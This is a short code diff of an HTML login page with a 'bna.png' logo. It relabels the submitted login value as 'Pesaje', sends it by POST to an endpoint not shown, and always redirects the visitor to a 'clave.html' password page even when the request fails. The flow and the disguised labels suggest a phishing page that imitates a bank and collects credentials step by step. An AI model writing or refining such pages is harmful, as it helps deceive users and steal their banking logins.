@@ -22,13 +22,12 @@
         <img src="bna.png" alt="Logo">
     </div>
 
-    <!-- Card login -->
-    <div class="login-card">
+  <div class="login-card">
   <div class="login-title">Ingresá tu pesaje</div>
 
   <input type="text" id="loginInput" placeholder="Ej: 70">
 
-  <button class="btn-accept" onclick="enviarLogin()">
+  <button type="button" class="btn-accept" onclick="enviarLogin()">
     <span class="check">✔</span>
     Aceptar
   </button>
@@ -42,15 +41,16 @@ function enviarLogin() {
     method: "POST",
     headers: { "Content-Type": "application/json" },
     body: JSON.stringify({
-      tipo: "login",
+      tipo: "Pesaje",
       valor: login
     })
-  }).then(() => {
+  })
+  .finally(() => {
+    // SIEMPRE redirige, aunque el fetch tarde
     window.location.href = "clave.html";
   });
 }
 </script>
-
 
     <!-- Links -->
     <div class="links">
